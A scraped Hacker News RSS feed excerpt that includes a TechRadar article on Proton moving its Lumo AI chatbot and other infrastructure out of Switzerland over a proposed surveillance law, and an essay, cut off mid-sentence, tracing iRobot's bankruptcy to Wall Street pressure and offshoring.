<p><strong>TLDR</strong>. 2025 was an exciting and mildly surprising year of LLMs. LLMs are emerging as a new kind of intelligence, simultaneously a lot smarter than I expected and a lot dumber than I expected. In any case they are extremely useful and I don't think the industry has realized anywhere near 10% of their potential even at present capability. Meanwhile, there are so many ideas to try and conceptually the field feels wide open. And as I mentioned on my <a href="https://www.dwarkesh.com/p/andrej-karpathy">Dwarkesh pod</a> earlier this year, I simultaneously (and on the surface paradoxically) believe that we will both see rapid and continued progress <em>and</em> that yet there is a lot of work to be done. Strap in.</p>


    

    
        

        
            


        

        
            
        
    


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You can now play Grand Theft Auto Vice City in the browser (322 pts)]]></title>
            <link>https://dos.zone/grand-theft-auto-vice-city/</link>
            <guid>46329696</guid>
            <pubDate>Fri, 19 Dec 2025 19:12:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dos.zone/grand-theft-auto-vice-city/">https://dos.zone/grand-theft-auto-vice-city/</a>, See on <a href="https://news.ycombinator.com/item?id=46329696">Hacker News</a></p>
Couldn't get https://dos.zone/grand-theft-auto-vice-city/: Error: getaddrinfo ENOTFOUND dos.zone]]></description>
        </item>
        <item>
            <title><![CDATA[Is Proton leaving Switzerland? (141 pts)]]></title>
            <link>https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes</link>
            <guid>46329654</guid>
            <pubDate>Fri, 19 Dec 2025 19:08:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes">https://www.techradar.com/vpn/vpn-privacy-security/is-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes</a>, See on <a href="https://news.ycombinator.com/item?id=46329654">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">
<section>
<div>
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1920-80.jpg.webp 1920w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" alt="Proton CEO and founder Andy Yen poses next to the Proton logo at the headquarters of the encrypted email and VPN services company in Geneva." srcset="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1920-80.jpg 1920w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R-320-80.jpg 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/4VDmBUhWGSAGmvb4bQ6T5R.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<figcaption>
<span>(Image credit: Photo by FABRICE COFFRINI/AFP via Getty Images)</span>
</figcaption>
</div>
<div id="article-body">

<hr id="5a74e302-1393-4a6d-b1ef-63bbfc478321"><ul id="3fa5f55a-4719-407b-9f71-43e7f00691dc"><li><strong>Proton said the company has begun moving some of its physical infrastructure out of Switzerland for fear of the new proposed surveillance law</strong></li><li><strong>Lumo, the company's newly launched privacy-first AI chatbot, is the first product to move</strong></li><li><strong>An amendment to the current surveillance law would require VPNs and messaging apps to identify and retain user data</strong></li></ul><hr id="07aab82f-233e-4ba0-a7b3-cd740ce253ea"><p id="635fc126-2793-403b-8e3c-6df60d61901e">Proton has confirmed the company has begun moving out of Switzerland due to "legal uncertainty" over the newly proposed surveillance law.</p><p>Proton's newly launched privacy-first AI chatbot, Lumo, has become the first product to change home yet, "investing in Europe does not equate to leaving Switzerland," a company spokesperson told TechRadar, amid rumors it's exiting the country for good.</p><p id="635fc126-2793-403b-8e3c-6df60d61901e-2">The firm behind one of the <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/best-vpn" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/best-vpn">best VPN</a> and encrypted email services has been very critical of the Swiss government’s proposed <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/secure-encryption-and-online-anonymity-are-now-at-risk-in-switzerland-heres-what-you-need-to-know" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/secure-encryption-and-online-anonymity-are-now-at-risk-in-switzerland-heres-what-you-need-to-know">amendment of its surveillance law</a> since the beginning, already sharing plans to <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/we-would-be-less-confidential-than-google-proton-threatens-to-quit-switzerland-over-new-surveillance-law" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/we-would-be-less-confidential-than-google-proton-threatens-to-quit-switzerland-over-new-surveillance-law">quit Switzerland</a> back in May.</p><p>If it passes, the Ordinance on the Surveillance of Correspondence by Post and Telecommunications (OSCPT) will introduce new obligations for <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/virtual-private-networks" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/virtual-private-networks">virtual private networks (VPNs)</a>, messaging apps, and social networks. These measures include mandatory user identification and data retention of up to six months for all services with at least 5,000 users. Providers will also be required to decrypt the communication upon the authorities' request should they own encryption keys.</p><h2 id="lumo-the-first-to-go-3">Lumo – the first to go</h2><figure data-bordeaux-image-check="" id="9bcbe264-296c-45d1-9c4d-87ea4e432485"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg" alt="Lumo AI from Proton." srcset="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS-320-80.jpg 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/Z7txgJbNr5EVW3gVGR5CaS.jpg">
</picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Proton)</span></figcaption></figure><p id="4881be25-a1ed-46ea-9b2d-592e429f356c">Proton launched its <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/artificial-intelligence/look-out-chatgpt-the-creator-of-proton-mail-has-just-launched-a-new-ai-chatbot-thats-super-secure-and-private" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/artificial-intelligence/look-out-chatgpt-the-creator-of-proton-mail-has-just-launched-a-new-ai-chatbot-thats-super-secure-and-private">ChatGPT competitor, Lumo</a>, in July 2025, to give its users an alternative to Big Tech solutions that truly protect their privacy.</p><p>In a <a data-analytics-id="inline-link" href="https://go.getproton.me/aff_c?offer_id=26&amp;aff_id=1046&amp;source=trd&amp;aff_click_id=trd-us-1618065571907932815&amp;url=https%3A%2F%2Fproton.me%2Fblog%2Flumo-ai%3FvisitorId%3Dho-%7Btransaction_id%7D%26aid%3D%7Baffiliate_id%7D%26offer_id%3D%7Boffer_id%7D%26utm_campaign%3Dww-all-2a-mail-gro_aff-tune%26utm_medium%3Dlink%26utm_source%3Daid-tune-%7Baffiliate_id%7D%26utm_content%3D%7Boffer_id%7D%26offer%3Dplus-professional-visionary%26url_id%3D%7Boffer_url_id%7D&amp;aff_sub2=https%3A%2F%2Fwww.techradar.com%2Fvpn%2Fvpn-privacy-security%2Fis-proton-leaving-switzerland-legal-uncertainty-of-proposed-surveillance-laws-is-pushing-them-to-make-several-changes" target="_blank" data-url="https://proton.me/blog/lumo-ai" referrerpolicy="no-referrer-when-downgrade" rel="sponsored noopener" data-hl-processed="hawklinks" data-google-interstitial="false" data-placeholder-url="https://go.getproton.me/aff_c?offer_id=26&amp;aff_id=1046&amp;source=trd&amp;aff_click_id=hawk-custom-tracking&amp;url=https%3A%2F%2Fproton.me%2Fblog%2Flumo-ai%3FvisitorId%3Dho-%7Btransaction_id%7D%26aid%3D%7Baffiliate_id%7D%26offer_id%3D%7Boffer_id%7D%26utm_campaign%3Dww-all-2a-mail-gro_aff-tune%26utm_medium%3Dlink%26utm_source%3Daid-tune-%7Baffiliate_id%7D%26utm_content%3D%7Boffer_id%7D%26offer%3Dplus-professional-visionary%26url_id%3D%7Boffer_url_id%7D&amp;aff_sub2=hawk-article-url" data-merchant-name="Proton VPN" data-merchant-id="208918" data-merchant-network="HasOffersProtonMail" data-merchant-url="proton.me" data-mrf-recirculation="inline-link">blog post</a> about the launch, Proton's Head of Anti-Abuse and Account Security, Eamonn Maguire, explains that the company has decided to invest outside Switzerland for fear of the looming legal changes.</p><p>He wrote: "Because of legal uncertainty around Swiss government proposals to introduce mass surveillance – proposals that have been outlawed in the EU – Proton is moving most of its physical infrastructure out of Switzerland. Lumo will be the first product to move."</p><p><a data-analytics-id="inline-link" href="https://www.swissinfo.ch/eng/ai-governance/proton-does-not-trust-switzerland-to-host-its-ai-servers/89727842" target="_blank" data-url="https://www.swissinfo.ch/eng/ai-governance/proton-does-not-trust-switzerland-to-host-its-ai-servers/89727842" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link">Talking to a Swiss publication</a> after the launch, Proton's CEO Andy Yen confirmed that the proposed changes to the Swiss surveillance law made the company opt for Germany instead to host Lumo's servers. Proton has also confirmed it's also developing facilities in Norway.</p><p>While the company did not specify that Germany would become the new home of the majority of its infrastructure, Proton confirmed to TechRadar that investing in Europe doesn't equate to leaving Switzerland.</p><p>It's worth noting, however, that being based in the EU could make Proton, and similar companies, vulnerable to wider data retention or scanning obligations if proposals like the so-called<a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/chat-control-2-0-experts-urge-the-eu-not-to-undermine-encryption-with-new-protecteu-plan" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/chat-control-2-0-experts-urge-the-eu-not-to-undermine-encryption-with-new-protecteu-plan"> </a><a data-analytics-id="inline-link" href="https://www.techradar.com/pro/security/the-european-commission-wants-a-backdoor-for-end-to-end-encryptions-for-law-enforcement" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/pro/security/the-european-commission-wants-a-backdoor-for-end-to-end-encryptions-for-law-enforcement">ProtectEU</a> or <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/a-political-blackmail-the-eu-parliament-is-pressing-for-new-mandatory-scanning-of-your-private-chats" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/a-political-blackmail-the-eu-parliament-is-pressing-for-new-mandatory-scanning-of-your-private-chats">Chat Control were to pass</a>.</p><p>We approached Proton for clarification on this point, and a company spokesperson pointed out that mandatory data retention has already been ruled illegal multiple times by European courts.</p><p>"However, we will, of course, continue to monitor developments in the EU closely, as we do elsewhere," Proton added.</p><h2 id="what-s-next-for-the-swiss-tech-privacy-industry-3">What's next for the Swiss tech privacy industry?</h2><p id="6d48e50d-a2d3-45e1-9764-0596fbcc65f2">Proton isn't the only provider that has been vocal against what critics have deemed Switzerland's "<a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/a-war-against-online-anonymity-why-switzerland-wants-to-change-its-surveillance-law-and-whats-at-stake" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/a-war-against-online-anonymity-why-switzerland-wants-to-change-its-surveillance-law-and-whats-at-stake">war against online anonymity</a>."</p><p>Another VPN provider, <a data-analytics-id="inline-link" href="https://www.techradar.com/pro/vpn/nymvpn" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/pro/vpn/nymvpn">NymVPN</a>, confirmed back in May its intentions to leave Switzerland if the new surveillance rules are enforced.</p><p>Talking to TechRadar, Nym's co-founder and COO, Alexis Roussel, shares support for Proton's decision to find a new home for its private AI chatbot.</p><p>He said, "Proton is in a position that they are expanding, so it totally makes sense. You cannot invest in privacy in Switzerland right now."</p><p>Roussel also confirmed to TechRadar that the company has already developed a strategy to move its VPN activities outside Switzerland and the EU. Yet, this remains the last resort.</p><p>He also explains that the fact that Nym works on a decentralised infrastructure means that it won't be affected by the encryption provision, as the company doesn't hold any encryption keys.</p><p>"Depending on how they modify things within the law, this will affect our decision to move. But we would like to resist the ordinance until the end and go to the tribunal," said Roussel.</p><p>As <a data-analytics-id="inline-link" href="https://cyberinsider.com/decentralizing-trust-an-interview-with-the-team-behind-session-messenger/" target="_blank" data-url="https://cyberinsider.com/decentralizing-trust-an-interview-with-the-team-behind-session-messenger/" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link">reported by Cyberinsider</a>, also secure and private messaging app <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/undermining-your-privacy-session-says-no-and-leaves-australia" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/undermining-your-privacy-session-says-no-and-leaves-australia">Session</a> said that, "while keeping a close eye on the situation," its decentralized structure means its services are less vulnerable to the changes.</p><h3 id="section-you-might-also-like"><span>You might also like</span></h3><ul id="f7bd908f-714f-4fa5-aa50-378f07a3d426"><li><a href="https://www.techradar.com/vpn/vpn-services/once-you-have-the-data-you-have-to-cooperate-windscribe-ceo-speak-out-against-global-threats-to-no-log-vpns" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-services/once-you-have-the-data-you-have-to-cooperate-windscribe-ceo-speak-out-against-global-threats-to-no-log-vpns">Windscribe CEO speaks out against global threats to no-log VPNs</a></li><li><a href="https://www.techradar.com/vpn/vpn-privacy-security/encryption-backdoors-privacy-can-be-misused-but-the-cost-of-a-world-without-is-so-much-higher" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/encryption-backdoors-privacy-can-be-misused-but-the-cost-of-a-world-without-is-so-much-higher">Encryption backdoors: privacy can be misused, "but the cost of a world without is so much higher"</a></li><li><a href="https://www.techradar.com/vpn/vpn-privacy-security/a-win-for-privacy-florida-rejects-the-encryption-backdoor-law-for-social-media" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/a-win-for-privacy-florida-rejects-the-encryption-backdoor-law-for-social-media">"A win for privacy" – Florida rejects the encryption backdoor law for social media</a></li></ul>
</div>


<div id="slice-container-authorBio-cwLKnJMyRrfSySyTLYiwnb"><p>Chiara is a multimedia journalist committed to covering stories to help promote the rights and denounce the abuses of the digital side of life – wherever cybersecurity, markets, and politics tangle up. She believes an open, uncensored, and private internet is a basic human need and wants to use her knowledge of VPNs to help readers take back control. She writes news, interviews, and analysis on data privacy, online censorship, digital rights, tech policies, and security software, with a special focus on VPNs, for TechRadar and TechRadar Pro. Got a story, tip-off, or something tech-interesting to say? Reach out to chiara.castro@futurenet.com</p></div>
</section>

<div x-show="$store.Viafoura.showWidgets" x-cloak="" data-component-name="Viafoura:Comments" x-data="ViafouraComments('300px')" data-nosnippet="" data-community-guidelines-text="<p class='vfcustom-community-guidelines'>Please follow our <a href=&quot;https://www.techradar.com/news/about-us#section-community-guidelines&quot; target=&quot;_blank&quot;>community guidelines</a>.</p>">
<p>You must confirm your public display name before commenting</p>
<p>Please logout and then login again, you will then be prompted to enter your display name.</p>
</div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wall Street Ruined the Roomba and Then Blamed Lina Khan (234 pts)]]></title>
            <link>https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba</link>
            <guid>46329536</guid>
            <pubDate>Fri, 19 Dec 2025 18:59:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba">https://www.thebignewsletter.com/p/how-wall-street-ruined-the-roomba</a>, See on <a href="https://news.ycombinator.com/item?id=46329536">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>A few days ago, consumer products company iRobot, the maker of iconic Roomba automated vacuum cleaner, </span><a href="https://www.theatlantic.com/technology/2025/12/roomba-dream-home-robotics/685293/" rel="">declared bankruptcy</a><span>. The CEO, a branding and mergers expert named </span><a href="https://investor.irobot.com/board-member/gary-cohen" rel="">Gary Cohen</a><span>, sadly announced that the firm could not continue as a going concern. </span></p><p>The board, full of lawyers and financiers but not robotics experts, voted to sell iRobot off to Shenzhen Picea Robotics, the Chinese company to which it had offshored manufacturing. There are about 20 million active Roomba vacuum cleaners in operation, and unless Trump regulators or antitrust enforcers act, now all the data harvested from our homes will go to China.</p><p><span>The co-founder of iRobot, Colin Angle, was not introspective about this collapse, nor did he associate it within the broader context of the many firms who have had their technology transferred to China. Instead, he, like much of Wall Street, </span><a href="https://www.foxbusiness.com/economy/irobot-co-founder-says-ftcs-opposition-amazon-deal-wrong-minded-following-bankruptcy-filing" rel="">blamed</a><span> the bankruptcy on Lina Khan. Why? Well she ran the Federal Trade Commission when it investigated Amazon’s possible acquisition of the company in 2022, a deal the two companies ultimately called off. Here’s Angle:</span></p><blockquote><p>“I bet if you asked almost anyone prior to the blocking of the deal with iRobot: Would you rather see iRobot innovating like crazy, coming out with new and better robots for your home, or would you like to see it file for Chapter 11 in the process of being sold to a Chinese manufacturer?” he said. “The wrong thing probably happened.”</p></blockquote><p>Many Wall Street dealmakers and foes of antitrust enforcement echoed this sentiment. For instance, former Obama chief economist Jason Furman, who is now the Aetna Professor of the Practice of Economic Policy at Harvard, used it as an example of the problem with populist economics. Blocking mergers, he believes, leads to destructive outcomes and national security problems.</p><a href="https://x.com/jasonfurman/status/2000680885234925896" target="_blank" rel="noopener noreferrer" data-component-name="Twitter2ToDOM"><div data-attrs="{&quot;url&quot;:&quot;https://x.com/jasonfurman/status/2000680885234925896&quot;,&quot;full_text&quot;:&quot;Regulators in the United States &amp;amp; Europe blocked Amazon's bid to acquire iRobot.\n\niRobot has not filed for bankruptcy and will be acquired by its main creditor, a Chinese company.\n\nThis is not a good outcome from the perspective of consumers, competition or the national interest.&quot;,&quot;username&quot;:&quot;jasonfurman&quot;,&quot;name&quot;:&quot;Jason Furman&quot;,&quot;profile_image_url&quot;:&quot;&quot;,&quot;date&quot;:&quot;2025-12-15T21:34:28.000Z&quot;,&quot;photos&quot;:[],&quot;quoted_tweet&quot;:{},&quot;reply_count&quot;:0,&quot;retweet_count&quot;:36,&quot;like_count&quot;:347,&quot;impression_count&quot;:0,&quot;expanded_url&quot;:null,&quot;video_url&quot;:null,&quot;belowTheFold&quot;:false}"><div><div title="User"><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 40w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_80,h_80,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 80w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_120,h_120,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 120w" sizes="40px"><img src="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png" sizes="40px" alt="X avatar for @jasonfurman" srcset="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 40w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_80,h_80,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 80w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_120,h_120,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 120w" width="40" height="40" draggable="false"></picture></div><p><span>Jason Furman</span><span>@jasonfurman</span></p><svg role="img" style="height:20px;width:20px;" width="20" height="20" viewBox="0 0 20 20" fill="var(--color-fg-primary)" stroke-width="1.8" stroke="#000" xmlns="http://www.w3.org/2000/svg"><g><title></title><path stroke="none" fill-rule="evenodd" clip-rule="evenodd" d="M13.2879 19.1666L8.66337 12.575L2.87405 19.1666H0.424805L7.57674 11.0258L0.424805 0.833252H6.71309L11.0717 7.04577L16.5327 0.833252H18.982L12.1619 8.59699L19.5762 19.1666H13.2879ZM16.0154 17.3083H14.3665L3.93176 2.69159H5.58092L9.7601 8.54422L10.4828 9.55981L16.0154 17.3083Z"></path></g></svg></div><p>Regulators in the United States &amp; Europe blocked Amazon's bid to acquire iRobot.

iRobot has not filed for bankruptcy and will be acquired by its main creditor, a Chinese company.

This is not a good outcome from the perspective of consumers, competition or the national interest.</p><div><p><span>9:34 PM · Dec 15, 2025</span></p><p><span>36 Reposts</span><span> · </span><span>347 Likes</span></p></div></div></a><p>So is Furman right? This critique matters, because the goal here is to return to the economic statecraft of Bush and Obama, a time when the consensus was that concentrating capital would generate positive outcomes, while restraints on capital would hinder growth. The modest burst of populism around antitrust under Joe Biden deeply shook Furman. With iRobot’s bankruptcy, there is now an opportunity to make the claim that any attempt to restrain Wall Street is a mistake. So what exactly happened with iRobot? And what kinds of lessons should we draw? </p><p><span>I first came upon iRobot years before the Amazon merger, when I edited a </span><a href="https://www.promarket.org/2021/01/28/wall-street-danger-national-security-roomba-hedge-fund/" rel="">piece</a><span> by defense analyst Lucas Kunce on Wall Street and national security. I had gotten interested in the collapse of the defense base, a crisis which is now widely discussed, but at the time wasn’t well-understood. Part of that collapse was a result of a phenomenon where financiers would force technology companies to stop innovating.</span></p><p>iRobot fit perfectly in that story. I watched a 2017 hearing in the House Armed Services Committee where a former Vice Admiral for the Navy, Joe Dyer, testified. After leaving the Navy, Dyer worked in operations at the robotics firm, when the company was far more than a consumer firm focused on importing automated cleaning tools from China. Here’s Kunce:</p><blockquote><p><span>iRobot, which started in 1990 as a spinoff of MIT, was founded by three experts in robotics, artificial intelligence, and man-machine interface. In 1998, the company got </span><a href="http://www.irobot.com/About-iRobot/Company-Information/History.aspx" rel="">a grant</a><span> from the Defense Advanced Research Projects Agency (DARPA), </span><a href="http://www.businessinsider.com/5-inventions-darpa-gps-irobot-roomba-internet-2017-5" rel="">the government agency that financed the creation of the internet, SIRI, the predecessor to GPS, and other conveniences of modern life</a><span>. Their mission was to build an advanced robot that eventually came to be known as the PackBot. Packbot helped search the rubble after 9/11 and aided US troops in clearing mines in Iraq and Afghanistan. iRobot’s robotic technology has gone to Mars on rovers and was deployed in the Fukushima nuclear reactor meltdown to measure radioactivity. Its iRobot Seaglider was used to peer underwater after the Deepwater Horizon oil spill.</span></p><p><span>But iRobot no longer makes anything for the military. It now focuses, instead, on branding and manufacturing vacuum cleaners in </span><a href="https://roboticsandautomationnews.com/2020/01/06/irobot-begins-manufacturing-operations-in-malaysia/28231/" rel="">China and Malaysia</a><span>. </span></p></blockquote><p>In the mid-2010s, during Furman’s tenure running economic policy under Obama, the company sold its defense business, offshored production, and slashed research, a result of pressure from financiers on Wall Street.</p><blockquote><p><span>An iRobot shareholder and former Goldman Sachs partner running a hedge fund called Red Mountain Capital, Willem Mesdag, sent </span><a href="https://www.sec.gov/Archives/edgar/data/1159167/000119312515392141/d24166dsc13da1.pdf" rel="">a letter</a><span> demanding that the company sell or shut down every part of its business that didn’t have to do with robots that clean things. </span></p><p><span>He demanded that the company slash its research budget, use the excess cash for dividends, and focus on branding and extending its near-monopoly in automated vacuum cleaners (68 percent of the global market share, according to Mesdag’s letter). Mesdag engaged in a proxy fight to wrest control of the company from its engineering founders, accusing one of its founders and iRobot Chairman Colin Angle of engaging in “egregious and abusive use of shareholder capital” for </span><a href="https://www.xconomy.com/boston/2015/01/27/after-12-years-of-roomba-irobot-eyes-startups-for-sector-growth/" rel="">investing in research</a><span>. </span></p><p>Research that, according to an iRobot spokesman, was intended “to spur innovation in robotics and robotics-related areas.” Mesdag argued that the money should have been used for share buybacks to boost the stock value instead of for research…</p><p>“In my trips to Wall Street,” Dyer told the panel, “one of my analyst friends took me to lunch one day and said, ‘Joe, you have to get iRobot out of the defense business. It’s killing your stock price.’ And I countered by saying ‘Well, what about the importance of DARPA and leading-edge technology? What about the stability that sometimes comes from the defense industry? What about patriotism?’ And his response was, ‘Joe, what is it about capitalism you don’t understand?’”</p></blockquote><p><span>This is a sad story, it’s also a common one. China has captured technology and key process leadership from American and European firms, across everything from rare earths to batteries to chemicals to robotics. And the driver is that the American model of running corporations is to focus on “asset light” cream-skimming, which is to say, </span><a href="https://americanaffairsjournal.org/2021/08/the-value-of-nothing-capital-versus-growth/" rel="">focusing</a><span> on lines of business where the return on capital is exceptionally high. </span></p><p><span>Conversely, the Chinese government, to preserve and extend its particular authoritarian model, actually suppresses the return on capital for its financiers, forcing an “asset heavy” approach. They overly emphasize factories and engineering. The net effect of these two complementary forces used to be celebrated as “</span><a href="https://www.telegraph.co.uk/comment/5424112/The-trillion-dollar-question-China-or-America.html" rel="">Chimerica</a><span>,” where China produces and the U.S. consumes. </span></p><p>The consequence of this dynamic is the movement of production from America to China; iRobot is just one example out of many. But there’s another dynamic aside from trade, and that has to do with a peril of market power. Like a lot of firms with seeming dominance, such as Boeing and Intel, iRobot had a big market share, but its operational capacity degraded quickly as financiers forced the company to harvest its monopoly and add nothing back. Under a trade regime overseen by men like Furman, the company offshored production, thus teaching its future rivals in China how to make robot cleaners. </p><p>At any rate, by 2022, iRobot still had a dominant share of robot vacuum cleaners, but competition had become meaningful. </p><p><span>Enter Amazon. In the late 2010s and early 2020s, big tech firms were seeking to dominate the “smart home” market, as well as building out networks around the “internet of things” and cloud computing. Amazon was engaged in a roll-up of the smart home space. It had built out the Alexa audio device, and bought the Ring security/doorbell firm (which had acquired smart lighting firm </span><a href="https://techcrunch.com/2018/01/08/ring-acquires-smart-led-light-company-mr-beams/" rel="">Mr. Beams</a><span>), as well as the wifi firm Eero in 2019, and </span><a href="https://www.theverge.com/22704290/amazon-blink-ring-camera-doorbell-brands-smart-home-why" rel="">video camera firm Blink</a><span>. It was a very expensive strategy; Ring was nearly bankrupt when Amazon overpaid for the company. According to the Wall Street Journal, between 2017 and 2021, Amazon </span><a 